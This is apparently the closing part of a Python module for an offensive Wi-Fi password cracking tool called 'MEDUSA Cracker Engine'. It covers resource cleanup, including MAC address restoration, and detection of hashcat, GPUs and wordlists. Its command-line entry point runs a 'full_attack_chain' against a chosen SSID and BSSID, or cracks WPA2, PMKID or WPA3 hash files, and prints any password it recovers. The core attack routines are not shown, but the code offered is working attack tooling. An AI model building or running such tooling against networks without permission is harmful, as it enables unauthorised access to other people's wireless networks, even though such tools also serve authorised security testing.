    def cleanup(self):
        """Clean up all resources — idempotent."""
        self.stop()
        self._executor.shutdown(wait=False)
        self._mac_mgr.restore_all()
        self._log("Cracker cleaned up")


# ============================================================================
# MODULE INITIALIZATION
# ============================================================================

def init(console=None) -> BruteForceEngine:
    """Initialize and return a configured BruteForceEngine.
    
    Auto-detects:
    - Hashcat availability
    - GPU devices
    - Wordlists
    - Potfile cache
    
    Args:
        console: Optional logger/console
    
    Returns:
        Configured BruteForceEngine instance
    """
    engine = BruteForceEngine(console)
    
    # Log capabilities
    if console:
        console.info(f"BruteForceEngine initialized")
        console.info(f"  Platform: {SYSTEM} ({CPU_COUNT} cores)")
        console.info(f"  Hashcat: {'available' if engine._hashcat_available else 'NOT FOUND'}")
        
        if engine._hashcat_available:
            devices = engine._hashcat.detect_devices()
            gpu_count = devices.get('gpu_count', 0)
            console.info(f"  GPU devices: {gpu_count}")
        
        # Discover wordlists
        wordlists = WordlistManager.discover_wordlists()
        console.info(f"  Wordlists found: {len(wordlists)}")
        for wl in wordlists[:5]:
            info = WordlistManager.get_wordlist_info(wl)
            console.info(f"    - {wl.name} ({info.get('lines_human', '?')} lines)")
        
        # Potfile stats
        if POTFILE_PATH.exists():
            pot_count = len(engine._potfile)
            console.info(f"  Potfile entries: {pot_count}")
    
    return engine


# ============================================================================
# EXPORTS
# ============================================================================

__all__ = [
    # Main engine
    'BruteForceEngine',
    
    # Sub-modules
    'PasswordDetector',
    'HashcatManager',
    'WordlistManager',
    'PasswordMutator',
    'MarkovPasswordGenerator',
    
    # Enums
    'CrackMethod',
    'CrackingStatus',
    'PasswordQuality',
    
    # Exceptions
    'CrackerError',
    'WordlistError',
    'HashcatError',
    'HashFileError',
    'NoTargetError',
    'CrackingInterrupted',
    
    # Utilities
    'HASHCAT_MODE_WPA2',
    'HASHCAT_MODE_PMKID',
    'HASHCAT_MODE_WPA3',
    'POTFILE_PATH',
    'CRACKED_CACHE_PATH',
    
    # Init
    'init',
]


# ============================================================================
# ENTRY POINT (standalone testing)
# ============================================================================

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="MEDUSA Cracker Engine")
    parser.add_argument("--ssid", help="Target SSID")
    parser.add_argument("--bssid", help="Target BSSID")
    parser.add_argument("--wordlist", "-w", help="Wordlist path")
    parser.add_argument("--hashfile", help="Hash file for hashcat")
    parser.add_argument("--mode", type=int, default=22000, help="Hashcat mode")
    parser.add_argument("--benchmark", action="store_true", help="Run benchmark")
    parser.add_argument("--analyze", help="Analyze a password")
    parser.add_argument("--interface", "-i", help="Network interface")
    parser.add_argument("--timeout", type=int, default=300, help="Timeout in seconds")
    
    args = parser.parse_args()
    
    print(f"MEDUSA Cracker Engine v{VERSION}")
    print(f"Codename: {CODENAME}")
    print(f"System: {SYSTEM} | CPU: {CPU_COUNT} cores")
    print("=" * 60)
    
    engine = init()
    
    if args.benchmark:
        results = engine.benchmark(quick=False)
        print(json.dumps(results, indent=2, default=str))
    
    elif args.analyze:
        analysis = engine.analyze_password(args.analyze)
        print(f"\nPassword Analysis: {args.analyze}")
        print(f"  Length: {analysis['length']}")
        print(f"  Quality: {analysis['quality']}")
        print(f"  Entropy: {analysis['entropy_bits']} bits")
        print(f"  Est. crack time: {analysis['estimated_crack_days']:.1f} days")
        print(f"  Mutations: {analysis['mutations']}")
    
    elif args.ssid:
        password = engine.full_attack_chain(
            WiFiNetwork(ssid=args.ssid, bssid=args.bssid or ""),
            wordlist=args.wordlist,
            interface=args.interface,
            timeout=args.timeout,
        )
        
        if password:
            print(f"\n✅ PASSWORD FOUND: {password}")
        else:
            print(f"\n❌ Password not found")
    
    elif args.hashfile:
        password = engine.hashcat_crack(
            hash_file=args.hashfile,
            hash_type=args.mode,
            wordlist=args.wordlist,
            timeout=args.timeout,
        )
        
        if password:
            print(f"\n✅ PASSWORD FOUND: {password}")
        else:
            print(f"\n❌ Password not found")
    
    else:
        parser.print_help()


                       
